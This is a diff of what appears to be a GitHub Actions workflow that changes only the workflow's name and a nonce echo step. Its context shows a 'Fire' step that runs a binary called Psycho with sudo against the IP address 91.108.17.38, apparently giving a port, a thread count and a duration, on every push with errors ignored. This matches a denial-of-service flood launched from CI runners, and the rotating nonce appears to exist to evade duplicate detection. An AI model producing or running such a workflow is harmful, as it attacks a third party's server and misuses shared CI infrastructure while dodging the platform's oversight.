@@ -1,4 +1,4 @@
-name: psycho-934b500b
+name: psycho-69fd8a78
 on:
   push:
     branches: [ main, master ]
@@ -23,5 +23,5 @@ jobs:
     - name: Fire
       run: sudo ./Psycho 91.108.17.38 32000 280 1200
       continue-on-error: true
-    - name: Nonce 934b500b
-      run: echo "nonce=934b500b"
+    - name: Nonce 69fd8a78
+      run: echo "nonce=69fd8a78"
